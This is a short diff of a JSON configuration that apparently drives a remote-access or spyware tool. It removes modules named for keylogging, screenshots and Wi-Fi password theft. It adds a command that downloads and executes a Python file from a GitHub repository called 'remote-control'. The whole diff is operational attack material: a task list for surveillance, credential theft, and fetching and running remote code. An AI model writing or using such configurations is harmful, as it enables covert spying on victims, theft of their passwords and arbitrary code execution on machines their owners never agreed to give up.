@@ -1,5 +1,3 @@
 {
-    "mod_screenshot": {},
-    "mod_keylogger": {},
-    "mod_wifipasswords": {}
+    "download_and_execute('https://api.github.com/repos/JelleFirlefyn/remote-control', '/test.py')": {}
 } 
